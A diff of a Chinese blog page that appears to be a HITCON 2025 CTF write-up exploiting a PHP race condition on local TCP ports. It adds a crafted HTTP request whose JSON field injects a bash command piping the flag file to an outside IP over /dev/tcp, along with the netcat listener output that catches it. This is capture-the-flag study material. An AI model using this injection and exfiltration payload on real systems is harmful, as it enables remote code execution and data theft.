@@ -302,7 +302,37 @@
 </span></span><span class=line><span class=cl>	    <span class=p>}</span>
 </span></span><span class=line><span class=cl>	<span class=p>}</span> 
 </span></span><span class=line><span class=cl>	<span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
-</span></span></code></pre></td></tr></table></div></div><p>利用<code>probe</code>把43个端口打乱，再接着逐个链接，成功之后传参即可RCE。</p><p>也就是说自己的TCP链接自己的，Race Condition即可</p><p>然而，端口的确定成了一个问题，我看到有这样的文章 <a class=link href=https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/ target=_blank rel=noopener>https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/</a></p><p>不知道代码怎么实现，他这里要开一个端口再自己去连，而且端口的地址还是靠内核来的</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
+</span></span></code></pre></td></tr></table></div></div><p>利用<code>probe</code>把43个端口打乱，再接着逐个链接，成功之后传参即可RCE。</p><p>也就是说自己的TCP链接自己的，Race Condition即可</p><p>然而，端口的确定成了一个问题，我看到有这样的文章 <a class=link href=https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/ target=_blank rel=noopener>https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/</a> 看着比实际其实复杂太多了<strong>Chara</strong>师傅给我讲解了一下问题</p><blockquote><p>多个php运行的时候 可能一个php的tcp打开了44444发送了json，另一个php的tcp也刚好打开了44444发送了json</p></blockquote><p>所以直接简单粗暴的就可以解决这个问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/?probe=§44444§</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>156.239.238.207:8080</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-aliave</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>{&#34;signal&#34;:&#34;Arrival&#34;,&#34;logogram&#34;:&#34;system(\&#34;bash -c &#39;cat /flag &gt;&amp; /dev/tcp/156.238.233.93/4444 0&gt;&amp;1&#39;\&#34;);&#34;}
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/hitcon2025/1.png width=1310 height=715 srcset="/p/hitcon2025/1_hu_4701f88ac3d47040.png 480w, /p/hitcon2025/1_hu_90bb85887113487b.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=183 data-flex-basis=439px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@dkhkKySag1YyfK:~# nc -lvnp <span class=m>4444</span>
+</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>4444</span>
+</span></span><span class=line><span class=cl>Connection received on 156.239.238.207 <span class=m>48260</span>
+</span></span><span class=line><span class=cl>hitcon<span class=o>{</span>123<span class=o>}</span>
+</span></span><span class=line><span class=cl>root@dkhkKySag1YyfK:~# 
+</span></span></code></pre></td></tr></table></div></div><p>当然了，既然是那个原理，所以我们直接一直打一个端口也能成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>GET /?probe<span class=o>=</span><span class=m>44444</span> HTTP/1.1
+</span></span><span class=line><span class=cl>Host: 156.239.238.207:8080
+</span></span><span class=line><span class=cl>Connection: keep-aliave
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span><span class=s2>&#34;signal&#34;</span>:<span class=s2>&#34;Arrival&#34;</span>,<span class=s2>&#34;logogram&#34;</span>:<span class=s2>&#34;system(\&#34;bash -c &#39;cat /flag &gt;&amp; /dev/tcp/156.238.233.93/4444 0&gt;&amp;1&#39;\&#34;);&#34;</span><span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>然后打null payloads就可以</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
 <a href=/tags/sqlite/>Sqlite</a>
 <a href=/tags/racecondition/>RaceCondition</a></section><section class=article-reward style="margin:var(--card-padding)0 0;display:block;text-transform:none;text-align:center"><h3 style="margin:0 0 .75rem;font-size:1.1rem">赞赏支持</h3><figure style="margin:0 auto"><img src=/wechat.png alt loading=lazy style="width:min(260px,90vw);height:auto;border:1px solid #eee;border-radius:12px;background:#fff;padding:6px;box-shadow:0 2px 8px rgba(0,0,0,4%)"><figcaption style=font-size:.9rem;color:#666;margin-top:.5rem></figcaption></figure></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
 <span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/ctfshow-extreme-challenge-3-byte-file-read/><div class=article-details><h2 class=article-title>Ctfshow极限大挑战之三字节读取文件</h2></div></a></article><article><a href=/p/shield-2025-iov-prelim/><div class=article-details><h2 class=article-title>招商铸盾2025车联网初赛</h2></div></a></article><article><a href=/p/ccf2025/><div class=article-details><h2 class=article-title>CCF2025</h2></div></a></article><article><a href=/p/l3hctf2025-gogogo-lets-go/><div class=article-details><h2 class=article-title>L3HCTF2025_gogogo出发喽</h2></div></a></article><article><a href=/p/r3ctf2025/><div class=article-details><h2 class=article-title>R3CTF2025</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
